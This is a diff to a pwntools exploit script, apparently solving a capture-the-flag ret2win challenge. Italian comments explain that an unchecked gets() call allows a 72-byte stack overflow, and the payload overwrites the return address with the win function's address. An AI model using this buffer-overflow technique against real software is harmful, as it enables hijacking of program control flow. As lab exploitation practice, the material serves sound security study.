@@ -54,10 +54,14 @@ continue
 # PIE:      No PIE (0x400000)
 
 io = start()
+# la vulnerabilità è un buffer overflow sulla gets(name) infatti gets prende input finche non trova un \n non controllando la dimensione del buffer da riempire
+# per questo bisogna mandare 72 bytes di garbage per rempire lo stack poi successivamente andare a sovrascrivere
+#il return address con l'indirizzo della function win che era visibile trammite gdb eseguendo il comando gdb: info funtions 
+#0x0000000000400786
 
 payload=flat(                                           
     b'A'*72,
-    p64(exe.sym.win)
+    p64(0x0000000000400786)
 )
 io.sendline(payload)
 
